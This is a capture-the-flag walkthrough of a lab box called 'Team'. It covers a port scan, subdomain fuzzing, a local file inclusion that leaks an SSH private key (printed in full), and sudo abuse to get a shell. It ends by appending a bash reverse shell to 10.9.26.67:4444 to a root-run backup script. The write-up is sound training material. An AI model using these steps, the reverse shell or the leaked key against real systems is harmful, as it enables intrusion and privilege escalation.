> Author: jak010  
> Date: 2021.05.19  

## Setup
- `sudo  echo "{EXPORT_IP} team.thm" >> /etc/hosts`

## Scan
- Command
    ```sh
    $ nmap -sC -sV {EXPORT_IP}
    ```
    - Result
        ```
        ...
        PORT   STATE SERVICE VERSION
        21/tcp open  ftp     vsftpd 3.0.3
        22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
        | ssh-hostkey:
        |   2048 79:5f:11:6a:85:c2:08:24:30:6c:d4:88:74:1b:79:4d (RSA)
        |   256 af:7e:3f:7e:b4:86:58:83:f1:f6:a2:54:a6:9b:ba:ad (ECDSA)
        |_  256 26:25:b0:7b:dc:3f:b2:94:37:12:5d:cd:06:98:c7:9f (ED25519)
        80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
        |_http-server-header: Apache/2.4.29 (Ubuntu)
        |_http-title: Apache2 Ubuntu Default Page: It works! If you see this add 'te...
        ...
        ```

## Web Enumeration
 - `http://team.thm/robots.txt`
    - Result
        ```
        dale
        ```

## Sub Domain Fuzz 
 - Command
    ```sh
    $ wfuzz -c --hw 977 -u http://team.thm -H "Host: Fuzz.team.thm" -w /usr/share/seclists/Discovery/DNS/namelist.txt
    ```
    - Reuslt
        ```
        ********************************************************
        * Wfuzz 3.1.0 - The Web Fuzzer                         *
        ********************************************************

        Target: http://team.thm/
        Total requests: 1907

        =====================================================================
        ID           Response   Lines    Word       Chars       Payload     
        =====================================================================
        000000494:   200        9 L      20 W       187 Ch      "dev - dev" 
        000001866:   200        89 L     220 W      2966 Ch     "www - www" 
        ```
        - Setting up
            - `echo EXPORT_IP dev.team.thm >> /etc/hosts` 

## LFI && Private Key Gaining
- `wordlist`: /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt
- `SSH Private key`: `http://dev.team.thm/script.php?page=/etc/ssh/sshd_config`
    - `dale.sshkey`
        ```
        -----BEGIN OPENSSH PRIVATE KEY-----
        b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
        NhAAAAAwEAAQAAAYEAng6KMTH3zm+6rqeQzn5HLBjgruB9k2rX/XdzCr6jvdFLJ+uH4ZVE
        NUkbi5WUOdR4ock4dFjk03X1bDshaisAFRJJkgUq1+zNJ+p96ZIEKtm93aYy3+YggliN/W
        oG+RPqP8P6/uflU0ftxkHE54H1Ll03HbN+0H4JM/InXvuz4U9Df09m99JYi6DVw5XGsaWK
        o9WqHhL5XS8lYu/fy5VAYOfJ0pyTh8IdhFUuAzfuC+fj0BcQ6ePFhxEF6WaNCSpK2v+qxP
        zMUILQdztr8WhURTxuaOQOIxQ2xJ+zWDKMiynzJ/lzwmI4EiOKj1/nh/w7I8rk6jBjaqAu
        k5xumOxPnyWAGiM0XOBSfgaU+eADcaGfwSF1a0gI8G/TtJfbcW33gnwZBVhc30uLG8JoKS
        xtA1J4yRazjEqK8hU8FUvowsGGls+trkxBYgceWwJFUudYjBq2NbX2glKz52vqFZdbAa1S
        0soiabHiuwd+3N/ygsSuDhOhKIg4MWH6VeJcSMIrAAAFkNt4pcTbeKXEAAAAB3NzaC1yc2
        EAAAGBAJ4OijEx985vuq6nkM5+RywY4K7gfZNq1/13cwq+o73RSyfrh+GVRDVJG4uVlDnU
        eKHJOHRY5NN19Ww7IWorABUSSZIFKtfszSfqfemSBCrZvd2mMt/mIIJYjf1qBvkT6j/D+v
        7n5VNH7cZBxOeB9S5dNx2zftB+CTPyJ177s+FPQ39PZvfSWIug1cOVxrGliqPVqh4S+V0v
        JWLv38uVQGDnydKck4fCHYRVLgM37gvn49AXEOnjxYcRBelmjQkqStr/qsT8zFCC0Hc7a/
        FoVEU8bmjkDiMUNsSfs1gyjIsp8yf5c8JiOBIjio9f54f8OyPK5OowY2qgLpOcbpjsT58l
        gBojNFzgUn4GlPngA3Ghn8EhdWtICPBv07SX23Ft94J8GQVYXN9LixvCaCksbQNSeMkWs4
        xKivIVPBVL6MLBhpbPra5MQWIHHlsCRVLnWIwatjW19oJSs+dr6hWXWwGtUtLKImmx4rsH
        ftzf8oLErg4ToSiIODFh+lXiXEjCKwAAAAMBAAEAAAGAGQ9nG8u3ZbTTXZPV4tekwzoijb
        esUW5UVqzUwbReU99WUjsG7V50VRqFUolh2hV1FvnHiLL7fQer5QAvGR0+QxkGLy/AjkHO
        eXC1jA4JuR2S/Ay47kUXjHMr+C0Sc/WTY47YQghUlPLHoXKWHLq/PB2tenkWN0p0fRb85R
        N1ftjJc+sMAWkJfwH+QqeBvHLp23YqJeCORxcNj3VG/4lnjrXRiyImRhUiBvRWek4o4Rxg
        Q4MUvHDPxc2OKWaIIBbjTbErxACPU3fJSy4MfJ69dwpvePtieFsFQEoJopkEMn1Gkf1Hyi
        U2lCuU7CZtIIjKLh90AT5eMVAntnGlK4H5UO1Vz9Z27ZsOy1Rt5svnhU6X6Pldn6iPgGBW
        /vS5rOqadSFUnoBrE+Cnul2cyLWyKnV+FQHD6YnAU2SXa8dDDlp204qGAJZrOKukXGIdiz
        82aDTaCV/RkdZ2YCb53IWyRw27EniWdO6NvMXG8pZQKwUI2B7wljdgm3ZB6fYNFUv5AAAA
        wQC5Tzei2ZXPj5yN7EgrQk16vUivWP9p6S8KUxHVBvqdJDoQqr8IiPovs9EohFRA3M3h0q
        z+zdN4wIKHMdAg0yaJUUj9WqSwj9ItqNtDxkXpXkfSSgXrfaLz3yXPZTTdvpah+WP5S8u6
        RuSnARrKjgkXT6bKyfGeIVnIpHjUf5/rrnb/QqHyE+AnWGDNQY9HH36gTyMEJZGV/zeBB7
        /ocepv6U5HWlqFB+SCcuhCfkegFif8M7O39K1UUkN6PWb4/IoAAADBAMuCxRbJE9A7sxzx
        sQD/wqj5cQx+HJ82QXZBtwO9cTtxrL1g10DGDK01H+pmWDkuSTcKGOXeU8AzMoM9Jj0ODb
        mPZgp7FnSJDPbeX6an/WzWWibc5DGCmM5VTIkrWdXuuyanEw8CMHUZCMYsltfbzeexKiur
        4fu7GSqPx30NEVfArs2LEqW5Bs/bc/rbZ0UI7/ccfVvHV3qtuNv3ypX4BuQXCkMuDJoBfg
        e9VbKXg7fLF28FxaYlXn25WmXpBHPPdwAAAMEAxtKShv88h0vmaeY0xpgqMN9rjPXvDs5S
        2BRGRg22JACuTYdMFONgWo4on+ptEFPtLA3Ik0DnPqf9KGinc+j6jSYvBdHhvjZleOMMIH
        8kUREDVyzgbpzIlJ5yyawaSjayM+BpYCAuIdI9FHyWAlersYc6ZofLGjbBc3Ay1IoPuOqX
        b1wrZt/BTpIg+d+Fc5/W/k7/9abnt3OBQBf08EwDHcJhSo+4J4TFGIJdMFydxFFr7AyVY7
        CPFMeoYeUdghftAAAAE3A0aW50LXA0cnJvdEBwYXJyb3QBAgMEBQYH
        -----END OPENSSH PRIVATE KEY-----
        ```
        - ssh -i dale.sshkey dale@team.thm

## PRIVILEGE ESCALATE
- `sudo -l`
    ```text
    Matching Defaults entries for dale on TEAM:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

    User dale may run the following commands on TEAM:
    (gyles) NOPASSWD: /home/gyles/admin_checks
    ```
    - `Run`: sudo -u gyles /home/gyles/admin_checks
        - `Input`: `/bin/bash`
    - `Work Flow`
        ```sh
        $ cd /home/gyles
        $ cat .bash_history
        ...
        cat /usr/local/bin/main_backup.sh 
        ...
        $ ls -al /usr/local/bin/main_backup.sh 
        -rwxrwxr-x 1 root admin 65 Jan 17 20:36 /usr/local/bin/main_backup.sh
        ```
        - `Reverse Shell Payload`
            ```sh
            bash -i >& /dev/tcp/10.9.26.67/4444 0>&1
            ```
            - echo "REVERSE_SHELL_PAYLOAD >> main_backup.sh"


